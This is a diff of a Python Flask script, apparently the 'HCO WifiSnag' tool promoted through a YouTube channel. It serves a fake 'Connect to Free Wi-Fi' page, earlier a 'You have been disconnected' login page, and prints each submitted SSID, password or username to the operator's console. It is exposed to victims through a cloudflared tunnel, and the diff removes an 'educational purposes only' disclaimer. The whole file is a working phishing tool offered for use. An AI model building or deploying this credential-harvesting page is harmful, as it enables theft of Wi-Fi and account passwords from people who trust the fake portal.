@@ -1,102 +1,91 @@
+from flask import Flask, request, render_template_string
 import os
 import time
-import webbrowser
-from flask import Flask, request, render_template_string
-import subprocess
-
-YOUTUBE_URL = "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"
 
 app = Flask(__name__)
 
-login_page = """
+# YouTube Redirect (works in Termux)
+def redirect_to_youtube():
+    print("\n\033[1;32m[!] This tool is not free!\033[0m")
+    print("\033[1;33m[>] Redirecting to our YouTube channel in 10 seconds...\033[0m")
+    time.sleep(10)
+    os.system("termux-open-url https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya")
+    input("\n\033[1;32m[✔] After subscribing, press Enter to continue...\033[0m\n")
+
+# WiFi Login Page HTML
+login_page = '''
 <!DOCTYPE html>
 <html>
 <head>
-  <title>WiFi Login</title>
-  <style>
-    body {
-      background-color: #111;
-      color: white;
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding-top: 80px;
-    }
-    .box {
-      background-color: #222;
-      padding: 20px;
-      border-radius: 10px;
-      display: inline-block;
-    }
-    input {
-      padding: 10px;
-      width: 80%%;
-      margin: 10px;
-      border: none;
-      border-radius: 5px;
-    }
-    button {
-      padding: 10px 20px;
-      background-color: #00ff00;
-      color: black;
-      font-weight: bold;
-      border: none;
-      border-radius: 5px;
-    }
-    .disclaimer {
-      margin-top: 30px;
-      font-size: 12px;
-      color: #888;
-    }
-  </style>
+    <title>Wi-Fi Login</title>
+    <style>
+        body {
+            background-color: #111;
+            color: white;
+            font-family: monospace;
+            text-align: center;
+            padding-top: 100px;
+        }
+        input {
+            padding: 10px;
+            margin: 10px;
+            width: 80%;
+            font-size: 16px;
+            border-radius: 5px;
+            border: none;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: crimson;
+            border: none;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        .box {
+            background-color: #222;
+            padding: 30px;
+            width: 300px;
+            margin: auto;
+            border-radius: 10px;
+            box-shadow: 0px 0px 20px red;
+        }
+    </style>
 </head>
 <body>
-  <div class="box">
-    <h2>You have been disconnected from WiFi</h2>
-    <p>Please log in again to restore your connection.</p>
-    <form method="POST">
-      <input type="text" name="username" placeholder="Enter Username" required><br>
-      <input type="password" name="password" placeholder="Enter Password" required><br>
-      <button type="submit">Login</button>
-    </form>
-  </div>
-  <div class="disclaimer">
-    This is a demo page for educational purposes only.
-  </div>
+    <div class="box">
+        <h2>Connect to Free Wi-Fi</h2>
+        <form method="POST" action="/login">
+            <input type="text" name="ssid" placeholder="Wi-Fi Name (SSID)" required><br>
+            <input type="password" name="password" placeholder="Wi-Fi Password" required><br>
+            <button type="submit">Connect</button>
+        </form>
+    </div>
 </body>
 </html>
-"""
+'''
 
-@app.route("/", methods=["GET", "POST"])
+@app.route('/')
 def index():
-    if request.method == "POST":
-        user = request.form.get("username")
-        pw = request.form.get("password")
-        print(f"\n📥 New credentials received!")
-        print(f"Username: {user}")
-        print(f"Password: {pw}")
-        return "<script>window.location.href='https://google.com';</script>"
     return render_template_string(login_page)
 
-def banner():
-    print("\n\033[1;32m" + "═" * 30)
-    print("║{:^28}║".format("HCO WifiSnag"))
-    print("═" * 30 + "\033[0m")
-    print("Subscribe to our YouTube channel to use this tool for free.")
-    print("Redirecting in 10 seconds...\n")
-    time.sleep(10)
-    webbrowser.open(YOUTUBE_URL)
-    input("Press Enter after subscribing to continue...\n")
+@app.route('/login', methods=['POST'])
+def login():
+    ssid = request.form.get('ssid')
+    password = request.form.get('password')
 
-def start_cloudflared():
-    print("Starting Cloudflared tunnel...")
-    os.system("pkill cloudflared >/dev/null 2>&1")
-    subprocess.Popen(["cloudflared", "tunnel", "--url", "http://localhost:5000"], stdout=subprocess.PIPE)
-    time.sleep(5)
-    os.system("curl -s http://localhost:4040/api/tunnels | grep -o 'https://[-a-z0-9]*\\.trycloudflare.com'")
+    print(f"\n\033[1;36m[📶] SSID:\033[0m {ssid}")
+    print(f"\033[1;31m[🔐] Password:\033[0m {password}\n")
 
-if __name__ == "__main__":
-    banner()
-    print("[*] Starting Flask server on port 5000...")
-    subprocess.Popen(["python3", "-m", "flask", "run", "--host=0.0.0.0", "--port=5000"])
-    time.sleep(3)
-    start_cloudflared()
+    return '''
+    <script>alert("Connected Successfully!");</script>
+    <h2 style="color:white; background:black; padding:20px; text-align:center;">
+    Thank you! Connecting to Wi-Fi...</h2>
+    '''
+
+if __name__ == '__main__':
+    redirect_to_youtube()
+    print("\033[1;32m[✔] Flask server running on http://127.0.0.1:5000\033[0m")
+    print("\033[1;34m[>] Now run: cloudflared tunnel --url http://127.0.0.1:5000\033[0m\n")
+    app.run(host='0.0.0.0', port=5000)
